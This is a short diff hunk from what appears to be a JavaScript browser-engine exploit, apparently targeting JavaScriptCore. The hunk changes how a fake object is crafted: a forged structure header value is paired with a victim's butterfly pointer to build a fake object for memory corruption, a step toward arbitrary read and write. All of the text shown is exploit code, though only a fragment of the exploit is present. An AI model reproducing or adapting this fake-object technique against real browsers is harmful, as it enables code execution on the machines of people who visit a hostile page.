@@ -562,7 +562,7 @@ var VM_PROT_EXECUTE = 0x4
     // craft a fake object to modify victim
     var flags_double_array = new Int64("0x0108200700001000").asJSValue();
     var container = {
-        header: new Int64("0x0108200700001000").asJSValue(),
+        header: flags_double_array,
         butterfly: victim
     };
 
